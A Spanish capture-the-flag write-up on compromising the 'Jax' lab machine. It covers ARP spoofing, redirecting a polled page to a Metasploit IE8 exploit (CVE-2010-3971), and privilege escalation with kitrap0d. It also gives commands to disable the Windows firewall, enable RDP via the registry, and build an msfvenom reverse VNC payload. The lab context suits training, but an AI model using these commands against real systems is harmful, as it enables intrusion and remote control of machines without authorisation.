# iHackLabs CTF - JAX

### Descripcion

En este CTF nos encontramos en un laboratorio del estilo OSCP con una conexión 
VPN para cada participante, el laboratorio se compone de 4 maquinas:
```
        +----------+  +----------+  +----------+  +----------+
        |  Cisco   |  |  Josie   |  |   Jax    |  |  Sammy   |
        |          |  |          |  |          |  |          |
        |10.x.0.150|  |10.x.0.151|  |10.x.0.152|  |10.x.0.153|
        +-----+----+  +---+------+  +--------+-+  +-----+----+
              ^           ^                  ^          ^
              |           |    +---------+   |          |
              |           +----+   VPN   +---+          |
              |                |         |              |
              +----------------+10.x.0.x +--------------+
                               +---------+
```
En este caso voy a contar como he resuelto la maquina Jax, tanto el acceso de
Administrador, como la parte de exploiting. 

### Búsqueda de Información

Comenzamos escaneando la maquina Jax, lanzamos un Nmap y observamos el puerto 80
abierto con un servidor IIS 7.5. Realizamos las tareas de enumeración web para
localizar posibles vectores vulnerables. Tras un exhaustivo reconocimiento 
llegamos a la conclusión de que no hay nada que podamos aprovechar en la 
parte web. Al no ver nada decidimos lanzar un wireshark para analizar el 
trafico de red. 

Tras un rato analizando el trafico decidimos hacer un ARP Spoofing para ver si
logramos interceptar alguna petición de la maquina .152. Después de la espera
encontramos en una de las tramas una petición web del servidor .152 al .153
```
                   +-----------+       +-----------+
                   |    Jax    |       |   Sammy   |
                   |           +------->           |
                   |10.x.0.152 |       | 10.x.0.153|
                   +-----------+       +-----------+
                      GET /wordpress/cepheus.html
```

Esta conexión se realiza desde Jax a Sammy que anteriormente había sido
vulnerada, con lo cual accedemos al archivo /var/log/httpd-access.log para ver 
las peticiones que esta realizando al servidor.
```
root@Sammy:/var/log # cat httpd-access.log

10.x.0.152 - - [24/Jan/2018:06:34:54 +0000] "GET /wordpress/cepheus.html 
HTTP/1.1" 304 - "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; 
Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
```
Si accedemos al archivo que esta solicitando el servidor nos encontramos con un
"Hola Mundo". Tras analizar el User-Agent nos percatamos de que la petición se
esta realizando desde un navegador Internet Explorer 8.0, proporcionando 
información que puede sernos de utilidad.

### Análisis de la vulnerabilidad

Buscando información sobre exploits públicos para Internet Explorer 8.0
damos con el exploit que se adapta al entorno que vamos a explotar. 

Se trata del CVE-2010-3971, un User-After-free en la función 
CSharedStyleSheet::Notify en el parser de CSS dentro de la librería mshtml.dll,
usado en IE6, IE7 y IE8 que permite ejecutar código. 

Tras analizar la vulnerabilidad, buscamos una PoC publica, localizamos 3, 
la PoC original del researcher que encontró el fallo, que produce un DoS. 
Un exploit de ejecución de código escrito en ruby y el tercero un modulo 
para metasploit también para ejecución de código.

### Explotación

Tras realizar varias pruebas con las PoC's publicas utilizamos el modulo de
metasploit para realizar la explotación. Accedemos al fichero cepheus.html para
modificar el "Hola Mundo" por una redirección a nuestro servidor donde montamos
con metasploit un servidor web con la PoC.
```
                          CVE-2010-3971
             +---------------------------------------+
             |                                       |
        +----v-----+      +----------+     +---------v--+
        |   Jax    |      |  Sammy   |     |LocalMachine|
        |          |      |          |     |            |
        |10.x.0.152|      |10.x.0.153|     |10.x.0.202  |
        +----+-----+      +--^-----+-+     +------+-----+
             |               |     |              ^
             +---------------^     |              |
       GET /wordpress/cepheus.html |              |
                                   |              |
                                   |              |
                                   +--------------+
                                       Redirect
                                    
```
```
use exploit/windows/browser/ms11_003_ie_css_import
```
Tras configurar las opciones de la reversa y las opciones del exploit como el
path procedemos a lanzarlo, la petición la realiza Jax a Sammy cada 5 min. por
lo que si el exploit falla tenemos que esperar otros 5 minutos para volver a
intentarlo.

```
10.x.0.152	ms11_003_ie_css_import - Received request for "/"
```

Tras recibir la shell con meterpreter ya tenemos acceso al servidor con el
usuario Ihacklabs, recorremos los directorios del sistema hasta llegar al
Escritorio donde tenemos el archivo Flag.txt con lo cual ya tenemos la flag de
acceso Admin del servidor, ahora tenemos que encontrar la flag de exploiting...

Tras un rato de búsqueda en la maquina localizamos un archivo .ova en descargas
y también nos percatamos que tiene instalado VirtualBox con lo cual nos dan a
entender que tenemos que acceder por RDP al sistema para poder acceder al
Virtualbox y continuar con el reto. Llegados a este punto procedemos a elevar
privilegios en el sistema para poder acceder a directorios que no tenemos
permisos o cualquier otra tarea que requiera permisos de NT SYSTEM,
con otro exploit para metasploit en este caso usamos:
```
use exploit/windows/local/ms10_015_kitrap0d
```
Tras elevar permisos lo que hacemos es desactivar el firewall
```
netsh advfirewall set allprofiles state off
```
Y levantar el servicio de RDP a través del registro del sistema.
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" 
/v fDenyTSConnections /t REG_DWORD /d 0 /f
```
Después de lanzar los comandos nos damos cuenta que el RDP no esta activo, con
lo cual revisamos la versión de Windows y vemos que es un Windows 7 Home por lo
tanto no vamos a tener RDP, tenemos que buscar una alternativa en este caso
utilizamos otra herramienta de metasploit, VNCInject para lograr conectar por
escritorio remoto a la maquina.

Generamos el payload con msfvenom para subirlo a la maquina y así lograr
conectar por escritorio remoto
```
msfvenom -p windows/vncinject/reverse_tcp lhost= lport= -f exe > vnc.exe
```
Ponemos el handler a la escucha y configuramos el payload sin olvidarnos de
configurar la opción para que nos deje utilizar el ratón.
```
use multi/handler
set payload windows/vncinject/reverse_tcp
```
Tras ejecutar el vnc.exe que hemos creado anteriormente con msfvenom recibimos
en el handler la conexión del servidor y nos muestra el escritorio.

Ahora abrimos el Virtualbox y allí nos encontramos una maquina montada que se
corresponde con la .ova encontrada anteriormente

Tras iniciar la maquina virtual vemos que somos capaces de acceder al grub con
lo que sin mirar mucho mas utilizamos la técnica del grub [init=/bin/bash] 
y accedemos como root al filesystem de la maquina virtual, vamos a la carpeta
/home/reto/flag.txt y encontramos la flag de Exploiting. Por fin hemos acabado
con todas las maquinas :D, aunque tengo las sospechas que esta ultima maquina 
no se hacia así...

Borja
